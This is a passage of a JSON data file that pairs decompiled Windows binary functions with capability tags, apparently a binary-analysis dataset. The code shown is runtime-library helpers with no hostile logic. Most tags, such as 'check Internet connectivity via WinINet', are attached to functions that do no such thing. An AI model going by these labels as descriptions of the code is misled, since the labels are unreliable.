        "decompiled_code": "\nuint * __cdecl fcn.004049e4(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    char cVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    char *var_8h;\n    uint var_4h;\n    \n    *arg_8h = *arg_ch;\n    uVar2 = arg_ch[1];\n    arg_8h[1] = uVar2;\n    if (uVar2 < '\\x02') {\n        if (**0x56f458 == '\\0') {\n            fcn.004017df(1);\n            fcn.004052f9(&var_8h, arg_8h);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n        }\n        else {\n            fcn.00401631(&var_8h);\n            fcn.004032bf(&var_10h, 0x20);\n            puVar1 = fcn.004052f9(&var_18h, arg_8h);\n            *arg_8h = *puVar1;\n            uVar2 = puVar1[1];\n            arg_8h[1] = uVar2;\n            if (uVar2 < '\\x02') {\n                if (**0x56f458 != '@') {\n                    var_8h = \"{for \";\n                    var_4h = 5;\n                    do {\n                        fcn.00405c95(&var_8h);\n                        cVar3 = *(arg_8h + 1);\n                        do {\n                            if ('\\x01' < cVar3) goto code_r0x00491167;\n                            if (**0x56f458 == '\\0') {\ncode_r0x0049114c:\n                                if (**0x56f458 == '\\0') {\n                                    fcn.0040648d(1);\n                                }\n                                fcn.00403cba(0x7d);\ncode_r0x00491167:\n                                if (**0x56f458 != '@') {\n                                    return arg_8h;\n                                }\n                                goto code_r0x0049116c;\n                            }\n                            if (**0x56f458 == '@') {\n                                if (cVar3 < '\\x02') goto code_r0x0049114c;\n                                goto code_r0x00491167;\n                            }\n                            uVar2 = fcn.004039f4(&var_18h);\n                            fcn.00402e87(&var_10h, 0x60, uVar2);\n                            uVar2 = fcn.004032bf(&var_20h, 0x27);\n                            fcn.00402eb9(uVar2);\n                            if (**0x56f458 == '@') {\n                                *0x56f458 = *0x56f458 + 1;\n                            }\n                            cVar3 = *(arg_8h + 1);\n                            if ('\\x01' < cVar3) goto code_r0x00491167;\n                        } while (**0x56f458 == '@');\n                        var_8h = 0x54f828;\n                        var_4h = 2;\n                    } while( true );\n                }\ncode_r0x0049116c:\n                *0x56f458 = *0x56f458 + 1;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 758
    },
    "00404a39": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404a39(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.004048e5(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.0040288d(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 438
    },
    "00404a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404a70(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 107
    },
    "00404a75": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a75(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 340
    },
    "00404a7f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a7f(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405df8(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405df8(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 414
    },
    "00404a98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404a98(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00404ab6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00404ab6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint extraout_ECX;\n    char *pcVar7;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(0x10);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.0040327e(*(*(unaff_EBP + 0x1c) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.004035a8(unaff_EBP + -0x1c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x10) = piVar5;\n    fcn.004050a6();\n    pcVar7 = *(unaff_EBP + 0x28);\n    puVar1 = *(unaff_EBP + 0x20);\n    do {\n        cVar4 = *pcVar7;\n        if (cVar4 == '\\0') {\ncode_r0x0047e835:\n            cVar4 = fcn.00403f7b(unaff_EBP + 0x14);\n            if (cVar4 != '\\0') {\n                *puVar1 = *puVar1 | 1;\n            }\n            puVar6 = *(unaff_EBP + 8);\n            uVar3 = *(unaff_EBP + 0x10);\n            *puVar6 = *(unaff_EBP + 0xc);\n            puVar6[1] = uVar3;\n            fcn.0040113b();\n            return;\n        }\n        if (cVar4 == '%') {\n            pcVar7 = pcVar7 + 1;\n            pcVar2 = *(**(unaff_EBP + -0x14) + 0x24);\n            (**0x573000)(unaff_EBP + -0x1c, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                         *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), puVar1, *(unaff_EBP + 0x24), *pcVar7, 0);\n            puVar6 = (*pcVar2)();\n            uVar3 = puVar6[1];\n            *(unaff_EBP + 0xc) = *puVar6;\n            *(unaff_EBP + 0x10) = uVar3;\ncode_r0x0047e7ed:\n            piVar5 = *(unaff_EBP + -0x10);\n        }\n        else {\n            if (cVar4 != ' ') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.004019e7();\n                }\n                pcVar2 = *(*piVar5 + 0x28);\n                (**0x573000)(*(unaff_EBP + 0x11), 0);\n                cVar4 = (*pcVar2)();\n                if (cVar4 == *pcVar7) {\n                    fcn.00401c5d();\n                    goto code_r0x0047e7ed;\n                }\n                *puVar1 = *puVar1 | 2;\n                goto code_r0x0047e835;\n            }\n            while (cVar4 = fcn.00403f7b(unaff_EBP + 0x14),  cVar4 == '\\0') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.004019e7();\n                }\n                if ((*(piVar5[3] + *(unaff_EBP + 0x11) * 2) & 0x48) == 0) break;\n                fcn.00401c5d();\n            }\n        }\n        pcVar7 = pcVar7 + 1;\n    } while( true );\n}\n",
        "token_count": 1061
    },
    "00404b06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00404b06(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00401f91(&var_ch, arg_8h, &var_14h, in_ECX + 0x18);\n    fcn.00403085(var_14h);\n    return;\n}\n",
        "token_count": 160
    },
    "00404b3d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b3d(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint var_4h;\n    \n    uVar1 = fcn.004dd863(arg_8h);\n    puVar3 = &var_20h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord;\n    var_20h = var_20h ^ (uVar1 & 0xffff ^ var_20h) & 7999;\n    fcn.004dd6ff(arg_8h);\n    return;\n}\n",
        "token_count": 213
    },
    "00404b56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b56(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t **in_ECX;\n    uint32_t uVar3;\n    \n    if (*in_ECX != arg_8h) {\n        if (*in_ECX != NULL) {\n            fcn.004040d9(*in_ECX);\n        }\n        *in_ECX = NULL;\n        if (arg_8h != NULL) {\n            iVar1 = *arg_8h;\n            piVar2 = arg_8h;\n            while (iVar1 != 0) {\n                piVar2 = piVar2 + 1;\n                iVar1 = *piVar2;\n            }\n            uVar3 = piVar2 + (2 - arg_8h) & 0xfffffffe;\n            piVar2 = fcn.0040159b(uVar3);\n            *in_ECX = piVar2;\n            if (piVar2 != NULL) {\n                fcn.0040576d(piVar2, arg_8h, uVar3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "00404b6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b6a(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char **in_ECX;\n    char *pcVar3;\n    \n    if (*in_ECX != arg_8h) {\n        if (*in_ECX != NULL) {\n            fcn.004040d9(*in_ECX);\n        }\n        *in_ECX = NULL;\n        if (arg_8h != NULL) {\n            cVar1 = *arg_8h;\n            pcVar3 = arg_8h;\n            while (cVar1 != '\\0') {\n                pcVar3 = pcVar3 + 1;\n                cVar1 = *pcVar3;\n            }\n            pcVar2 = fcn.0040159b(pcVar3 + (1 - arg_8h));\n            *in_ECX = pcVar2;\n            if (pcVar2 != NULL) {\n                fcn.0040576d(pcVar2, arg_8h, pcVar3 + (1 - arg_8h));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "00404b7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00404b7e(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t var_4h;\n    \n    if (*0x570490 == 0) {\n        var_4h = 1;\n        if ((*(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8) < 0) || (fcn.00402cde(&var_4h),  *0x570490 = 1,  var_4h == 1)) {\n            *0x570490 = 2;\n        }\n    }\n    return *0x570490;\n}\n",
        "token_count": 139
    },
    "00404bf6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404bf6(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_18h;\n    char *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00405a1f(arg_ch);\n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n    }\n    else {\n        if (cVar1 == '?') {\n            *0x56f458 = *0x56f458 + 1;\n            var_10h = NULL;\n            var_ch = 0;\n            puVar2 = fcn.004013d4(&var_18h, &var_8h, 0, &var_10h, 0);\n            var_8h = *puVar2;\n            var_4h = puVar2[1];\n            fcn.00403625(arg_8h, &var_8h);\n            return arg_8h;\n        }\n        if (cVar1 != 'X') {\n            fcn.00403625(arg_8h, &var_8h);\n            return arg_8h;\n        }\n        *0x56f458 = *0x56f458 + 1;\n        if (var_8h == 0) {\n            var_10h = \"void\";\n            var_ch = 4;\n            fcn.00402cfc(&var_10h);\n            return arg_8h;\n        }\n        var_10h = \"void \";\n        var_ch = 5;\n        fcn.00402cfc(&var_10h);\n    }\n    fcn.004052f9(arg_8h, &var_8h);\n    return arg_8h;\n}\n",
        "token_count": 417
    },
    "00404c19": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00404c19(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uchar *puVar9;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar10;\n    int32_t *in_FS_OFFSET;\n    bool bVar11;\n    uint32_t in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint32_t in_stack_ffffffd8;\n    uchar *noname_16;\n    int32_t iVar12;\n    uint noname_18;\n    \n    puVar9 = &stack0xffffffa4;\n    noname_18 = 0x41e230;\n    iVar12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar3 = *param_1;\n    iVar8 = *(iVar3 + 4);\n    piVar7 = *(param_1 + iVar8 + 0x38);\n    piVar4 = param_1;\n    noname_16 = &stack0xffffffa4;\n    if (piVar7 != NULL) {\n        (**(*piVar7 + 4))();\n        iVar3 = *param_1;\n        iVar8 = *(iVar3 + 4);\n        noname_16 = puVar9;\n    }\n    if (*(param_1 + iVar8 + 0xc) == 0) {\n        piVar7 = *(param_1 + iVar8 + 0x3c);\n        if ((piVar7 == NULL) || (piVar7 == param_1)) {\n            uVar6 = CONCAT31(in_stack_ffffffd8 >> 8, 1);\n        }\n        else {\n            fcn.0040303a();\n            iVar3 = *param_1;\n            uVar10 = 0;\n            bVar11 = *(param_1 + *(iVar3 + 4) + 0xc) == 0;\n            uVar6 = in_stack_ffffffd8 & 0xffffff00 | bVar11;\n            puVar9 = &stack0xfffffffc;\n            if (!bVar11) goto code_r0x00417346;\n        }\n        piVar7 = *(*(param_1 + *(iVar3 + 4) + 0x30) + 4);\n        (**(*piVar7 + 4))();\n        piVar4 = fcn.004053e4(&stack0xffffffac, in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, piVar7, \n                              in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                              in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, piVar4, uVar6\n                              , param_1, noname_16, iVar12, noname_18, 4, unaff_ESI, unaff_EDI, unaff_EBX, unaff_EBP);\n        if ((piVar7 != NULL) && (puVar5 = (**(*piVar7 + 8))(),  puVar5 != NULL)) {\n            (***puVar5)(1);\n        }\n        iVar12 = *(*param_1 + 4);\n        (**(*piVar4 + 0x18))\n                  (&stack0xffffffa4, *(param_1 + iVar12 + 0x38) << 0x20, param_1 + iVar12, *(param_1 + iVar12 + 0x40), \n                   param_2, param_3);\n        uVar10 = (in_stack_ffffffa4 & 0xff) << 2;\n        puVar9 = &stack0xfffffffc;\n    }\n    else {\n        uVar10 = 0;\n        puVar9 = &stack0xfffffffc;\n    }\ncode_r0x00417346:\n    while( true ) {\n        iVar12 = *(*param_1 + 4);\n        uVar6 = *(param_1 + iVar12 + 0xc) & 0x17 | uVar10 | (*(param_1 + iVar12 + 0x38) == 0) << 2;\n        *(param_1 + iVar12 + 0xc) = uVar6;\n        if ((uVar6 & *(param_1 + iVar12 + 0x10)) == 0) break;\n        fcn.00404372(puVar9 + -0x3c, 1);\n        *(puVar9 + -0x10) = 3;\n        fcn.00405ed4();\n        *(puVar9 + -0x50) = vtable.std::ios_base::failure.0;\n        fcn.004066d1(puVar9 + -0x50, 0x560cfc);\n        param_1 = *(puVar9 + -0x14);\n        uVar10 = 0;\n        puVar9 = puVar9 + 0xc;\n    }\n    cVar2 = fcn.00402108();\n    if (cVar2 == '\\0') {\n        *(puVar9 + -0x10) = 2;\n        *(puVar9 + -0x2c) = *(puVar9 + -0x28);\n        fcn.00405443();\n        param_1 = *(puVar9 + -0x20);\n        piVar7 = *(puVar9 + -0x2c);\n    }\n    else {\n        piVar7 = *(puVar9 + -0x28);\n    }\n    piVar7 = *(piVar7 + *(*piVar7 + 4) + 0x38);\n    if (piVar7 != NULL) {\n        pcVar1 = *(*piVar7 + 8);\n        *(puVar9 + -0x10) = 1;\n        (*pcVar1)();\n        param_1 = *(puVar9 + -0x20);\n    }\n    *in_FS_OFFSET = *(puVar9 + -0x18);\n    return param_1;\n}\n",
        "token_count": 1480
    },
    "00404c46": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c46(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.00401ac8(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00404c6e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00404c6e(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = *(arg_14h * 8 + 0x54eb88);\n    var_ch = *(arg_14h * 8 + 0x54eb8c);\n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        fcn.004017df(1);\n        fcn.00405c95(&var_10h);\n        if (*arg_ch != 0) {\n            fcn.00402eb9(arg_ch);\n        }\n        if (*arg_10h != 0) {\n            if (*arg_ch != 0) {\n                fcn.00403cba(0x20);\n            }\n            fcn.00402eb9(arg_10h);\n        }\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else if (((cVar1 < '6') || ('9' < cVar1)) && (cVar1 != '_')) {\n        fcn.004013d4(&var_10h, arg_10h, arg_14h, arg_ch, 0);\n        fcn.00405097(arg_8h, &var_10h, arg_14h == 1);\n    }\n    else {\n        fcn.00402cfc(&var_10h);\n        if ((*arg_ch != 0) && ((*arg_10h == 0 || ((arg_10h[1] & 0x100U) == 0)))) {\n            fcn.00402eb9(arg_ch);\n        }\n        if (*arg_10h != 0) {\n            fcn.00402eb9(arg_10h);\n        }\n        fcn.0040683e(arg_8h, &var_8h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 482
    },
    "00404cb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t * fcn.00404cb4(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t **ppiVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t **ppiVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    fcn.004057e5(0);\n    iVar10 = 0xc;\n    ppiVar3 = *(var_18h + 0x9c) + 0x11c;\n    ppiVar8 = ppiVar3;\n    do {\n        piVar6 = ppiVar8[-0xc];\n        piVar4 = piVar6 + 1;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar5 = *ppiVar8;\n        piVar9 = piVar5 + 1;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        ppiVar8 = ppiVar8 + 1;\n        iVar7 = iVar7 + 2 + (piVar5 - piVar9 >> 1) + (piVar6 - piVar4 >> 1);\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    piVar4 = fcn.00403ff3(iVar7 * 2 + 2);\n    if (piVar4 == NULL) {\n        piVar4 = NULL;\n    }\n    else {\n        var_ch = 0;\n        piVar6 = piVar4;\n        do {\n            *piVar6 = 0x3a;\n            piVar9 = piVar6 + 1;\n            iVar10 = fcn.004038dc(piVar9, (iVar7 - (piVar9 - piVar4 >> 1)) + 1, ppiVar3[-0xc]);\n            if (iVar10 != 0) {\ncode_r0x004bc47d:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            piVar5 = piVar9;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            piVar9 = piVar9 + (piVar5 - (piVar6 + 2) >> 1);\n            *piVar9 = 0x3a;\n            piVar6 = piVar9 + 1;\n            iVar10 = fcn.004038dc(piVar6, (iVar7 - (piVar6 - piVar4 >> 1)) + 1, *ppiVar3);\n            if (iVar10 != 0) goto code_r0x004bc47d;\n            piVar5 = piVar6;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            ppiVar3 = ppiVar3 + 1;\n            piVar6 = piVar6 + (piVar5 - (piVar9 + 2) >> 1);\n            var_ch = var_ch + 1;\n        } while (var_ch < 0xc);\n        *piVar6 = 0;\n    }\n    fcn.00406302(0);\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return piVar4;\n}\n",
        "token_count": 929
    },
    "00404cc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
